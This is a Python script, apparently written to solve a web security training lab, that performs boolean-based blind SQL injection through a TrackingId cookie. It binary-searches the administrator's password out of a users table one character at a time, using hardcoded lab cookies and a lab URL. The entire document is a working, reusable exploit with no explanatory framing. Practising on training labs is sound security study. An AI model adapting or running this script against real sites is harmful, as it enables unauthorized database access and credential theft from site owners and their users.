import requests
import time

str_injecter = "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),"
# str_injecter = "' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator'),"

def normalInjection(url, cookies, i_start, i_end, i_index):
    str_cpy = cookies['TrackingId']
    cookies['TrackingId'] = cookies['TrackingId'] + str_injecter + str(i_index) + ",1)" + ">'" + chr(
        int((i_start + i_end) / 2))

    respond_obj = requests.get(url, cookies=cookies)

    sequence = cookies['TrackingId']

    cookies['TrackingId'] = str_cpy

    str_text = respond_obj.text

    if str_text.rfind("Server Error") != -1:
        print(sequence)
        print("normal " + str_text)
        return -1

    if str_text.rfind("Welcome back!") == -1:
        return 1
    else:
        return 2

def spNormalInjection(url, cookies, i_start, i_end, i_index):
    str_cpy = cookies['TrackingId']
    cookies['TrackingId'] = cookies['TrackingId'] + str_injecter + str(i_index) + "," + str(i_index) + ")" + "='" + chr(
        i_start)

    respond_obj = requests.get(url, cookies=cookies)

    sequence = cookies['TrackingId']

    cookies['TrackingId'] = str_cpy

    str_text = respond_obj.text

    if str_text.rfind("Server Error") != -1:
        print(sequence)
        print("sp " + str_text)
        return -1

    if str_text.rfind("Welcome back!") == -1:
        return chr(i_end)
    else:
        return chr(i_start)

def equalInjection(url, cookies, i_index):
    str_cpy = cookies['TrackingId']
    cookies['TrackingId'] = cookies['TrackingId'] + str_injecter + str(i_index) + "," + str(i_index) + ")" + "='\0"

    respond_obj = requests.get(url, cookies=cookies)

    sequence = cookies['TrackingId']

    cookies['TrackingId'] = str_cpy

    str_text = respond_obj.text

    if str_text.rfind("Server Error") != -1:
        print(sequence)
        print("equal " + str_text)
        return -1

    if str_text.rfind("Welcome back!") == -1:
        return 0
    else:
        return 1

url = "https://0a93004e04fe2b9a81e9f43c00030001.web-security-academy.net/"
cookies = {'TrackingId' : 'V1Dm0Y7MOWgdruVu',
           'session' : 'nC3yTsK3cTErni2fARqnExcjMCG6jLTF',
           }

str_password = ''

i_start = 32
i_end = 126

i_index = 1



if __name__ == '__main__':
    i_fun = 1


    while(equalInjection(url, cookies, i_index) == 0):
        if(i_end - i_start > 1):
            i_res = normalInjection(url, cookies, i_start, i_end, i_index)

            if(i_res == -1):
                str_password += "error"
                break

            i_data = int((i_start + i_end) / 2)
            if(i_res == 1):
                i_end = i_data
            else:
                i_start = i_data

        else:
            c_res = spNormalInjection(url, cookies, i_start, i_end, i_index)

            if(c_res == -1 ):
                str_password += "error"
                break

            str_password += c_res
            i_index += 1
            i_start = 32
            i_end = 126
            print(str_password)


        print(i_fun)
        i_fun += 1

        # time.sleep(0.2)
    print(str_password)